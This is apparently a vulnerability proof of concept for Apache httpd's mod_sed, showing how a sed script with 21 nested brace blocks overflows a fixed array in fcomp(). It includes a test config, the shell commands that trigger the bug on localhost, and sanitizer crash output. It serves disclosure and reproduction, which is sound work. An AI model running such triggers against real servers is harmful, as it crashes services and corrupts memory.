# PoC 198 - Block Nesting Stack Overflow

`fcomp()` in `sed0.c` writes to `commands->cmpend[commands->depth++]` with no
bound check, so a sed script with more than `SED_DEPTH` (20) nested `{`
blocks writes past the fixed array.

## Setup

httpd with `mod_sed` enabled.

`/tmp/httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule mime_module           modules/mod_mime.so
LoadModule sed_module            modules/mod_sed.so
LoadModule dir_module            modules/mod_dir.so

DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    Require all granted
    AddOutputFilter Sed html
    OutputSed "$(cat /tmp/script.sed)"
</Directory>
```

(or use `Sed` directives that load the script from disk; the handler still
calls the same `fcomp()` compiler from `modules/filters/sed0.c:296`.)

Build httpd with `-fsanitize=address` to catch the out-of-bounds write.

## Trigger

Generate a sed script with 21 nested `{` opens, exceeding `SED_DEPTH = 20`:

```sh
mkdir -p /tmp/htdocs
echo "<html>x</html>" > /tmp/htdocs/index.html
python3 -c "print('{\n' * 21)" > /tmp/script.sed
httpd -DFOREGROUND -f /tmp/httpd.conf &
curl -s http://127.0.0.1:8080/index.html >/dev/null
```

The first incoming response triggers script compilation through
`fcomp()` and reaches the unguarded store on the 21st `{`.

## Observed effect

- ASan report:

  ```
  ==pid==ERROR: AddressSanitizer: global-buffer-overflow on address 0x...
  WRITE of size 8 at 0x... thread T0
      #0 in fcomp modules/filters/sed0.c:296
  ```

  Offset of the OOB store is exactly `sizeof(void*) * SED_DEPTH` past the
  base of `commands->cmpend`, hitting the adjacent `ptrspace` field as
  documented in the finding.
- Without ASan, the corrupted `ptrspace` head is later dereferenced by
  `alloc_reptr()` (`modules/filters/sed0.c:1016`), causing the worker to
  SIGSEGV on the first response handled by this filter context.
- Log marker: `child pid ... exit signal Segmentation fault (11)` and, under
  ASan, the `fcomp` frame at the top of the report.

A standalone reproduction without httpd uses the same script as input to a
small program that calls `compile_sed()` / `fcomp()` directly from
`mod_sed.c`. The same OOB write is observed at iteration 21.
